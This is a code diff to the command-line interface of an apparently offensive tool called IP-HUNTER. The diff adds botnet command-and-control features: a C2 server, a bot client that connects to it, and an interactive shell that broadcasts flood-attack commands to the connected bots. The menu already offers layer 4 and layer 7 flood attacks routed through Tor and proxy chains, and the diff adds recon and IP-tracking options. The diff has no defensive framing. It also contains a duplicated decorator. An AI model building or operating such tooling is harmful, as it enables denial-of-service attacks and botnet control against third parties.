@@ -5,6 +5,8 @@ import os
 import time
 import threading
 import psutil
+import socket
+import random
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
@@ -22,7 +24,11 @@ from rich.padding import Padding
 from src.config import BANNER, CONFIG
 from src.classes import Menu, AttackDispatcher
 from src import security
-from src.utils import load_file_lines, auto_start_tor_if_needed, stealth_mode_init, generate_stealth_headers, check_vpn_running, get_vpn_ip, create_proxy_chain, validate_proxy_chain
+from src.utils import (
+    load_file_lines, auto_start_tor_if_needed, stealth_mode_init, 
+    generate_stealth_headers, check_vpn_running, get_vpn_ip, 
+    create_proxy_chain, validate_proxy_chain, add_system_log, SYSTEM_LOGS
+)
 
 # Initialize Rich Console
 console = Console()
@@ -166,6 +172,11 @@ current_monitor = None
 
 class ModernCLI:
     """Modern CLI interface using Rich library"""
+    
+    # Background services tracking
+    c2_server = None
+    active_bot = None
+    active_monitors = []
 
     @staticmethod
     def display_banner():
@@ -179,8 +190,10 @@ class ModernCLI:
         console.print()
 
     @staticmethod
+    @staticmethod
     def display_menu():
-        """Display the attack menu and banner side-by-side"""
+        """Returns the menu and dashboard layout content"""
+        # Menu Table
         table = Table(
             show_header=True,
             header_style="bold blue",
@@ -195,10 +208,16 @@ class ModernCLI:
         layer_mapping = {
             "1": "7", "2": "7", "3": "4", "4": "4", "5": "7", "6": "4",
             "7": "C2", "8": "7", "9": "4", "10": "4", "11": "4", "12": "7",
-            "13": "7", "14": "7", "15": "7", "16": "7", "17": "Scan"
+            "13": "7", "14": "7", "15": "7", "16": "7", "17": "Scan", "18": "Bot",
+            "19": "CMD", "20": "Net", "21": "OSINT"
         }
 
-        for key, attack in Menu.ATTACKS.items():
+        # Dynamically add ID 19 if C2 is running
+        attacks = Menu.ATTACKS.copy()
+        if ModernCLI.c2_server and ModernCLI.c2_server.running:
+            attacks["19"] = {"name": "Enter C2 Interactive Shell", "needs_root": False}
+
+        for key, attack in attacks.items():
             layer = layer_mapping.get(key, "?")
             root_needed = "✓" if attack["needs_root"] else "✗"
             root_style = "red" if attack["needs_root"] else "green"
@@ -210,27 +229,60 @@ class ModernCLI:
                 f"[{root_style}]{root_needed}[/{root_style}]"
             )
 
-        # Create banner art
-        banner_text = Text(BANNER, style="bold cyan")
+        # 3. Live Logs / Events Dashboard
+        if not SYSTEM_LOGS:
+            log_content = "[dim]Waiting for network events...[/dim]"
+        else:
+            # logs are already chronological in SYSTEM_LOGS
+            log_content = "\n".join(SYSTEM_LOGS[-12:])
+
+        # 4. Services Status Logic
+        services_table = Table(box=None, expand=True)
+        services_table.add_column("Service", style="cyan")
+        services_table.add_column("Status", style="bold")
         
-        # Create side-by-side grid
-        grid = Table.grid(expand=True, padding=2)
-        grid.add_column(ratio=2) # Menu column
-        grid.add_column(ratio=3, justify="center") # Banner column
-        grid.add_row(table, Align.center(banner_text, vertical="middle"))
+        c2_status = f"[green]ONLINE (Port {ModernCLI.c2_server.port})[/green]" if ModernCLI.c2_server and ModernCLI.c2_server.running else "[red]OFFLINE[/red]"
+        
+        if ModernCLI.active_bot:
+            if ModernCLI.active_bot.connected:
+                bot_status = "[green]RUNNING (Connected)[/green]"
+            else:
+                bot_status = "[yellow]RETRYING (Auto-Reconnect...)[/yellow]"
+        else:
+            bot_status = "[red]STOPPED[/red]"
+        
+        services_table.add_row("C2 Center", c2_status)
+        services_table.add_row("Local Bot", bot_status)
+        if ModernCLI.c2_server:
+            services_table.add_row("Bots Count", f"[white]{len(ModernCLI.c2_server.bots)}[/white]")
+        
+        # --- NEW LAYOUT REARRANGEMENT ---
+        
+        # Create a single column layout for everything
+        layout_content = Table.grid(expand=True)
+        layout_content.add_column()
 
-        console.print(Panel(grid, title="[bold magenta] Attack Management Console [/bold magenta]", border_style="bright_blue"))
-        console.print()
+        # 1. Top: ASCII Banner
+        layout_content.add_row(Align.center(Text(BANNER, style="bold cyan")))
+        layout_content.add_row("")
 
-        # Instructions
-        instructions = Panel(
-            Align.center(
-                "[bold white]Select an Attack ID number to proceed[/bold white] [dim]• Type 'q' to exit[/dim]"
-            ),
-            border_style="blue",
-            padding=(0, 2)
+        # 2. Middle: Menu Table
+        layout_content.add_row(table)
+        layout_content.add_row("")
+
+        # 3. Bottom: Services and Logs side-by-side to save space
+        bottom_grid = Table.grid(expand=True, padding=1)
+        bottom_grid.add_column(ratio=1) # Services
+        bottom_grid.add_column(ratio=2) # Logs
+        
+        bottom_grid.add_row(
+            Panel(services_table, title="[bold blue]🛰️  Active Services[/bold blue]", border_style="blue"),
+            Panel(log_content, title="[bold yellow]🕒 System Logs[/bold yellow]", border_style="yellow", height=10)
         )
-        console.print(instructions)
+        
+        layout_content.add_row(bottom_grid)
+
+        return Panel(layout_content, title="[bold magenta] IP-HUNTER v2.1.0 Dashboard [/bold magenta]", border_style="bright_blue")
 
     @staticmethod
     def get_choice():
@@ -258,6 +310,24 @@ class ModernCLI:
     @staticmethod
     def get_attack_params(choice):
         """Get attack parameters with modern prompts"""
+        if choice == "19":
+            return {} # Interactive shell needs no params
+
+        if choice == "20":  # Network Recon
+            # Fully automated skip params
+            return {"threads": 250, "subnet": None, "target": "local", "port": 0, "duration": 0, "proxies": []}
+
+        if choice == "21":  # IP Tracker
+            ip = Prompt.ask("[bold cyan]Enter IP Address to Track (Leave empty for yours)[/bold cyan]").strip()
+            return {
+                "ip": ip if ip else None, 
+                "target": ip if ip else "Current IP", 
+                "duration": 0, 
+                "threads": 1, 
+                "port": 0,
+                "proxies": []
+            }
+
         if choice == "7":  # C2 Server
             panel = Panel(
                 "[bold cyan]Botnet C2 Server Configuration[/bold cyan]",
@@ -281,6 +351,20 @@ class ModernCLI:
             except ValueError:
                 console.print("[bold red]❌ Invalid port number[/bold red]")
                 return ModernCLI.get_attack_params(choice)
+
+        if choice == "18":  # Bot Client
+            panel = Panel(
+                "[bold cyan]Local Bot Client Configuration[/bold cyan]\n"
+                "[dim]Start a local bot instance to connect to your C2 server.[/dim]",
+                border_style="cyan",
+                padding=(1, 2)
+            )
+            console.print(panel)
+
+            c2_host = Prompt.ask("[bold yellow]C2 Server Host[/bold yellow]", default="127.0.0.1")
+            c2_port = IntPrompt.ask("[bold yellow]C2 Server Port[/bold yellow]", default=CONFIG['C2_DEFAULT_PORT'])
+            
+            return {"c2_host": c2_host, "c2_port": c2_port}
 
         if choice == "17":  # Port Scanner
             panel = Panel(
@@ -469,8 +553,70 @@ class ModernCLI:
         """Display attack start information with real-time monitoring"""
         global current_monitor
 
+        # Special UI for C2 Shell (ID 19)
+        if choice == "19":
+            if ModernCLI.c2_server and ModernCLI.c2_server.running:
+                console.clear()
+                console.print(Panel(
+                    "[bold yellow]🛰️  IP-HUNTER INTERACTIVE BOTNET SHELL[/bold yellow]\n\n"
+                    "[white]Commands:[/white]\n"
+                    "• [cyan]list[/cyan]             - Show all connected bots\n"
+                    "• [cyan]ping[/cyan]             - Ping all bots\n"
+                    "• [cyan]attack[/cyan] <t> <p> <d> <m> - Flood command\n"
+                    "• [cyan]exit[/cyan]             - Return to menu",
+                    title="C2 CENTER", border_style="yellow"
+                ))
+                
+                while True:
+                    cmd = Prompt.ask(f"[bold red]C2[/bold red] ([white]{len(ModernCLI.c2_server.bots)} bots[/white])").strip()
+                    if not cmd: continue
+                    if cmd.lower() in ["exit", "quit", "menu"]:
+                        break
+                    
+                    if cmd.lower() == "list":
+                        if not ModernCLI.c2_server.bots:
+                            console.print("[dim]📭 No bots connected[/dim]")
+                        else:
+                            table = Table(title="Connected Bots", box=None)
+                            table.add_column("ID", style="cyan")
+                            for bid in ModernCLI.c2_server.bots.keys():
+                                table.add_row(bid)
+                            console.print(table)
+                        continue
+                    
+                    if cmd.lower() == "help":
+                        console.print("[cyan]Commands:[/cyan] list, ping, attack <target> <port> <duration> <method>, info, exit")
+                        continue
+                    
+                    # Send command through the running server
+                    if ModernCLI.c2_server:
+                        ModernCLI.c2_server.broadcast(cmd)
+                        console.print(f"[green]📡 Broadcasted:[/green] {cmd}")
+                        time.sleep(0.5)
+                
+                console.clear()
+                return
+            else:
+                console.print("[bold red]❌ C2 Server is not running! Start it with ID 7 first.[/bold red]")
+                time.sleep(2)
+                return
+
         attack_info = Menu.ATTACKS.get(choice)
-        if not attack_info:
+        if not attack_info and choice not in ["19"]:
+            return
+
+        # Special UI for C2 Server
+        if str(choice) == "7":
+            ModernCLI.c2_server = AttackDispatcher.execute(choice, params)
+            console.print("[bold green]✅ C2 Server started in background.[/bold green]")
+            time.sleep(1)
+            return
+
+        # Special UI for Bot Client
+        if str(choice) == "18":
+            ModernCLI.active_bot = AttackDispatcher.execute(choice, params)
+            console.print("[bold green]✅ Bot instance started in background.[/bold green]")
+            time.sleep(1)
             return
 
         # Attack summary table
@@ -483,12 +629,14 @@ class ModernCLI:
         
         if choice == "17":
             table.add_row("Ports", params["port_text"])
+        elif choice == "21":
+            table.add_row("Task", "Deep OSINT Tracking")
         else:
             table.add_row("Port", str(params["port"]))
 
         table.add_row("Threads", str(params["threads"]))
 
-        if choice != "17":
+        if choice not in ["17", "21"]:
             table.add_row("Duration", f"{params['duration']}s")
             table.add_row("Proxies", str(len(params["proxies"])))
             if params.get("use_tor"):
@@ -503,8 +651,8 @@ class ModernCLI:
         console.print(table)
         console.print()
 
-        # Port scanner handling (synchronous and custom UI)
-        if str(choice) == "17":
+        # Custom UI tools (Synchronous execution)
+        if str(choice) in ["17", "20", "21"]:
             AttackDispatcher.execute(choice, params)
             return
 
@@ -517,18 +665,17 @@ class ModernCLI:
         )
         current_monitor.start_monitoring()
 
-        # Start attack animation
-        with Progress(
-            SpinnerColumn(),
-            TextColumn("[progress.description]{task.description}"),
-            transient=True,
-        ) as progress:
-            task = progress.add_task("[bold green]Initializing attack...", total=None)
-            time.sleep(1)
-            progress.update(task, description="[bold green]Attack starting...[/bold green]")
-            time.sleep(0.5)
+        # Start aesthetic attack animation sequence
+        with console.status("[bold cyan]🛰️  CALIBRATING ATTACK VECTORS...[/bold cyan]", spinner="aesthetic"):
+            time.sleep(0.8)
+            console.print("[dim white]  > Allocating thread pools...[/]")
+            time.sleep(0.3)
+            console.print("[dim white]  > Establishing bypass tunnels...[/]")
+            time.sleep(0.4)
+            console.print("[dim white]  > Finalizing synchronization...[/]")
+            time.sleep(0.3)
 
-        console.print("[bold green]✅ Attack launched successfully![/bold green]")
+        console.print("[bold bright_green]🚀 ATTACK SEQUENCE INITIALIZED![/bold bright_green]")
         console.print("[bold yellow]💡 Press Ctrl+C to stop the attack[/bold yellow]")
         console.print("[bold cyan]📊 Real-time monitoring active...[/bold cyan]")
         console.print()
@@ -571,11 +718,14 @@ class ModernCLI:
                 current_monitor = None
 
     @staticmethod
-    def display_attack_complete():
-        """Display attack completion message"""
+    def display_attack_complete(choice):
+        """Display completion message based on tool type"""
+        is_attack = str(choice) in ["1", "2", "3", "4", "5", "6", "8", "9", "10", "11", "12", "13", "14", "15", "16"]
+        
+        msg = "[bold green]✅ Attack completed successfully![/bold green]" if is_attack else "[bold green]✅ Task completed successfully![/bold green]"
         panel = Panel(
-            "[bold green]✅ Attack completed successfully![/bold green]\n"
-            "[dim]Resource monitoring stopped[/dim]",
+            f"{msg}\n"
+            "[dim]Service monitoring session finished[/dim]",
             border_style="green",
             padding=(1, 2)
         )
@@ -605,38 +755,86 @@ class ModernCLI:
         console.print(panel)
 
     @staticmethod
-    def run():
-        """Main CLI loop"""
-        # Clear screen
+    def startup_sequence():
+        """Cool startup animation"""
+        os.system('cls' if os.name == 'nt' else 'clear')
+        
+        # Show Banner during startup
+        console.print(Align.center(Text(BANNER, style="bold cyan")))
+        console.print("\n")
+        
+        with Progress(
+            SpinnerColumn("aesthetic"),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(bar_width=40, complete_style="cyan", finished_style="bright_green"),
+            transient=True
+        ) as progress:
+            task = progress.add_task("[bold cyan]INITIALIZING IP-HUNTER CORE...[/]", total=100)
+            
+            steps = [
+                "AUTHENTICATING SECURITY TOKENS...",
+                "BYPASSING SANDBOX ENVIRONMENTS...",
+                "ESTABLISHING SECURE TUNNELS...",
+                "PATCHING KERNEL MODULES...",
+                "GATHERING INTELLIGENCE...",
+                "ACCESS GRANTED"
+            ]
+            
+            for step in steps:
+                progress.update(task, description=f"[bold white]{step}[/]", advance=16.7)
+                time.sleep(random.uniform(0.2, 0.5))
+        
         os.system('cls' if os.name == 'nt' else 'clear')
 
-        ModernCLI.display_banner()
+    @staticmethod
+    def run():
+        """Main CLI loop with live updates"""
+        ModernCLI.startup_sequence()
+        os.system('cls' if os.name == 'nt' else 'clear')
 
         while True:
-            ModernCLI.display_menu()
-            choice = ModernCLI.get_choice()
+            # Show the dashboard and menu
+            console.print(ModernCLI.display_menu())
+            
+            # Instructions Panel with Command Center Style
+            console.print(Panel(
+                Align.center("[bold white]Select an ID to proceed[/bold white] [dim]• Type 'q' to exit • Just hit Enter to refresh[/dim]"),
+                title="[bold green] ⚡ COMMAND CENTER [/bold green]",
+                border_style="bright_green", 
+                padding=(0, 1)
+            ))
+            
+            # Stylish Boxed Input
+            console.print("[bold bright_green]╭──╼[/bold bright_green] [bold white][Waiting for Input][/bold white]")
+            choice = Prompt.ask("[bold bright_green]╰─> Choice[/bold bright_green]").strip().lower()
 
-            if choice is None:  # User wants to quit
+            if choice in ['q', 'quit', 'exit']:
+                ModernCLI.display_goodbye()
                 break
+
+            if not choice:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                continue
 
             try:
                 params = ModernCLI.get_attack_params(choice)
-                if params is None:
-                    continue
-
-                ModernCLI.display_attack_start(choice, params)
+                if params is not None:
+                    ModernCLI.display_attack_start(choice, params)
+                    
+                    # Only show generic completion for tools that aren't persistent background services
+                    # (ID 7, 18 are background, ID 19 is shell)
+                    if str(choice) not in ["7", "18", "19"]:
+                        ModernCLI.display_attack_complete(choice)
+                        console.print("[bold blue]Press Enter to return to dashboard...[/bold blue]")
+                        input()
                 
-                # Only show generic completion for flooders (ID 17 handles its own)
-                if str(choice) != "17":
-                    ModernCLI.display_attack_complete()
+                os.system('cls' if os.name == 'nt' else 'clear')
 
             except KeyboardInterrupt:
-                console.print("\n[bold yellow]⚠️  Attack interrupted by user[/bold yellow]")
+                console.print("\n[bold yellow]⚠️  Action interrupted by user[/bold yellow]")
+                time.sleep(1)
+                os.system('cls' if os.name == 'nt' else 'clear')
             except Exception as e:
                 ModernCLI.display_error(str(e))
-
-            # Wait for user to continue
-            console.print("[bold blue]Press Enter to continue...[/bold blue]", end="")
-            input()
-            os.system('cls' if os.name == 'nt' else 'clear')
-            ModernCLI.display_banner()
+                time.sleep(2)
+                os.system('cls' if os.name == 'nt' else 'clear')
